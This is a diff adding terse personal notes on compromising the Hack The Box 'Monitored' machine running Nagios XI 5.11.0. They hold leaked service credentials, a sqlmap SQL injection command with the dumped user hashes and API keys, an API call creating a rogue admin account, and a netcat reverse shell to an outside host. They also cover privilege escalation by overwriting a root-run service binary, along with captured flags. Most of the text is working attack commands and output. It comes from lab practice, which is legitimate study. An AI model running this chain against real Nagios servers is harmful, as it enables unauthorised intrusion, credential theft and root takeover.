@@ -1,0 +1,173 @@
+IP: 10.10.11.248
+Nmap scan report for nagios.monitored.htb (10.10.11.248)
+Host is up (0.22s latency).
+Not shown: 996 closed tcp ports (reset), 990 closed udp ports (port-unreach)
+PORT      STATE         SERVICE  VERSION
+22/tcp    open          ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+80/tcp    open          http     Apache httpd 2.4.56
+389/tcp   open          ldap     OpenLDAP 2.2.X - 2.3.X
+443/tcp   open          ssl/http Apache httpd 2.4.56 ((Debian))
+68/udp    open|filtered dhcpc
+123/udp   open          ntp      NTP v4 (unsynchronized)
+161/udp   open          snmp     SNMPv1 server; net-snmp SNMPv3 server (public)
+162/udp   open          snmp     net-snmp; net-snmp SNMPv3 server
+1041/udp  open|filtered danf-ak2
+6004/udp  open|filtered X11:4
+22996/udp open|filtered unknown
+31073/udp open|filtered unknown
+44185/udp open|filtered unknown
+49201/udp open|filtered unknown
+Service Info: Host: monitored; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Application is running Nagios XI@5.11.0 running Nagios core@4.4.13
+
+Found path /nagios and logged in with admin:admin
+
+Credentials
+admin:admin (Incorrect, probably set by other user)
+smp:svc:XjH7VCehowpR1xZB - snmpwalk - snmpwalk -v 1 -c public 10.10.11.248  > snmpwalk.txt
+mysql:nagiosadmin:$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C
+
+
+Potential RCE vulnerability here: https://nagios.monitored.htb//nagiosxi/includes/components/ccm/index.php ()
+
+LDAP search
+# extended LDIF
+#
+# LDAPv3
+# base <DC=monitored,DC=htb> with scope baseObject
+# filter: (objectclass=*)
+# requesting: * +
+#
+
+# monitored.htb
+dn: dc=monitored,dc=htb
+objectClass: top
+objectClass: dcObject
+objectClass: organization
+o: monitored.htb
+dc: monitored
+structuralObjectClass: organization
+entryUUID: 77745478-135f-103e-9685-07c908eafea6
+creatorsName: cn=admin,dc=monitored,dc=htb
+createTimestamp: 20231109152157Z
+entryCSN: 20231109152157.799344Z#000000#000#000000
+modifiersName: cn=admin,dc=monitored,dc=htb
+modifyTimestamp: 20231109152157Z
+entryDN: dc=monitored,dc=htb
+subschemaSubentry: cn=Subschema
+hasSubordinates: FALSE
+
+# search result
+search: 2
+result: 0 Success
+IP1
+
+Application is vulnerable to CVE-2023-40931
+
+https://nvd.nist.gov/vuln/detail/CVE-2019-15949
+
+Generate API token with API request
+curl -XPOST -k -L "https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1" -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=500"
+
+Exploit with sqlmap
+sqlmap -u "https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=2&token=2bf1051fc6a8c846026bce9bb295832783f4728b"  -p id  --level 5 --risk 3 --threads 10 --batch --hex -D nagiosxi -T xi_users --dump
++---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
+| user_id | email               | name                 | api_key                                                          | enabled | password                                                     | username    | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket                                                   | last_edited_by | login_attempts | last_password_change |
++---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
+| 1       | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | nagiosadmin | 0          | 1701931372 | 1           | 1701427555  | 0            | 0            | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0                                 | 5              | 0              | 1701427555           |
+| 2       | svc@monitored.htb   | svc                  | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0       | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | svc         | 1          | 1699724476 | 1           | 1699728200  | 1699634403   | 1699730174   | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1              | 3              | 1699697433           |
++---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
+
+
+Created user account
+curl -XPOST -k -L "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?pretty=1&apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL" -d "username=suguru&password=mugiwara&name=Sukuna&email=geto@localhost&auth_level=admin"
+
+
+Used the command bit of CCM to execute code. Set the command to just args ($ARG1$ $ARG2$ $ARG3$ $ARG4$ $ARG5$)
+
+Got reverse shell by running nc -e /bin/bash 10.10.14.14 2281 on nagios server
+Flags
+user: 31cb9010aef6c2198f12ca566a53d5c3
+root: 0c4868046196d718a7548af54c251210
+
+
+In sudoers file
+User nagios may run the following commands on localhost:
+    (root) NOPASSWD: /etc/init.d/nagios start
+    (root) NOPASSWD: /etc/init.d/nagios stop
+    (root) NOPASSWD: /etc/init.d/nagios restart
+    (root) NOPASSWD: /etc/init.d/nagios reload
+    (root) NOPASSWD: /etc/init.d/nagios status
+    (root) NOPASSWD: /etc/init.d/nagios checkconfig
+    u can't write on systemd PATH
+    (root) NOPASSWD: /etc/init.d/npcd start
+    (root) NOPASSWD: /etc/init.d/npcd stop
+    (root) NOPASSWD: /etc/init.d/npcd restart
+    (root) NOPASSWD: /etc/init.d/npcd reload
+    (root) NOPASSWD: /etc/init.d/npcd status
+    (root) NOPASSWD: /usr/bin/php
+        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
+    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
+    (root) NOPASSWD: /usr/bin/php
+        /usr/local/nagiosxi/scripts/migrate/migrate.php *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
+
+
+Running find /usr/local/nagiosxi/scripts -name '*.php' -or '*.sh' gives:
+-rwxr-xr-- 1 nagios nagios   76 Nov  9 10:44 /usr/local/nagiosxi/scripts/automation/ansible/ncpa_autoregister/run.sh
+-r-xr-x--- 1 root   nagios 7.7K Nov  9 10:44 /usr/local/nagiosxi/scripts/backup_xi.sh
+-r-xr-x--- 1 nagios nagios 3.2K Nov  9 10:44 /usr/local/nagiosxi/scripts/ccm_snapshot.sh
+-r-xr-x--- 1 root   nagios 1.9K Nov  9 10:44 /usr/local/nagiosxi/scripts/change_timezone.sh
+-r-xr-x--- 1 root   nagios  17K Nov  9 10:44 /usr/local/nagiosxi/scripts/components/getprofile.sh
+-r-xr-x--- 1 root   nagios 3.9K Nov  9 10:44 /usr/local/nagiosxi/scripts/manage_services.sh
+-r-xr-x--- 1 root   nagios 3.8K Nov  9 10:44 /usr/local/nagiosxi/scripts/manage_ssl_config.sh
+-rwxr-xr-x 1 nagios nagios  506 Nov  9 10:44 /usr/local/nagiosxi/scripts/nom_create_nagioscore_checkpoint_cond.sh
+-rwxr-xr-x 1 nagios nagios 1.5K Nov  9 10:44 /usr/local/nagiosxi/scripts/nom_create_nagioscore_checkpoint.sh
+-rwxr-xr-x 1 nagios nagios  859 Nov  9 10:44 /usr/local/nagiosxi/scripts/nom_create_nagioscore_errorpoint.sh
+-rwxr-xr-x 1 nagios nagios 1.5K Nov  9 10:44 /usr/local/nagiosxi/scripts/nom_restore_nagioscore_checkpoint.sh
+-rwxr-xr-x 1 nagios nagios 1.5K Nov  9 10:44 /usr/local/nagiosxi/scripts/nom_restore_nagioscore_checkpoint_specific.sh
+-rwxr-xr-x 1 nagios nagios 5.3K Nov  9 10:44 /usr/local/nagiosxi/scripts/nom_trim_checkpoints.sh
+-rwxr-xr-x 1 nagios nagios  963 Nov  9 10:44 /usr/local/nagiosxi/scripts/reconfigure_nagios.sh
+-rwxr-xr-x 1 nagios nagios 4.1K Nov  9 10:44 /usr/local/nagiosxi/scripts/remove_historical_data.sh
+-r-xr-x--- 1 root   nagios 1.7K Nov  9 10:44 /usr/local/nagiosxi/scripts/repair_databases.sh
+-r-xr-x--- 1 root   nagios 4.1K Nov  9 10:44 /usr/local/nagiosxi/scripts/repairmysql.sh
+-r-xr-x--- 1 root   nagios 6.1K Nov  9 10:44 /usr/local/nagiosxi/scripts/reset_config_perms.sh
+-rwxr-xr-x 1 nagios nagios 1.9K Nov  9 10:44 /usr/local/nagiosxi/scripts/restart_nagios_with_export.sh
+-rwxr-xr-x 1 nagios nagios 2.8K Nov  9 10:44 /usr/local/nagiosxi/scripts/restore_defaults.sh
+-rwxr-xr-x 1 nagios nagios  15K Nov  9 10:44 /usr/local/nagiosxi/scripts/restore_xi.sh
+-r-xr-x--- 1 root   nagios 2.9K Nov  9 10:44 /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
+
+╔══════════╣ Analyzing .service files
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
+/etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path
+/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
+/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
+/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
+/etc/systemd/system/multi-user.target.wants/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
+/etc/systemd/system/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
+You can't write on systemd PATH
+
+You can write SUID file: /usr/local/nagios/libexec/check_icmp
+You can write SUID file: /usr/local/nagios/libexec/check_dhcp
+
+
+Added BELOW to /usr/local/nagios/bin/npcd
+#!/bin/bash
+cat /root/root.txt > /home/nagios/chief.txt
+
+And then restarted the npcd.service, which contains
+[Unit]
+Description=Nagios Process Control Daemon
+After=syslog.target network.target local-fs.target
+
+[Service]
+ExecStart=/usr/local/nagios/bin/npcd -f /usr/local/nagios/etc/pnp/npcd.cfg
+
+[Install]
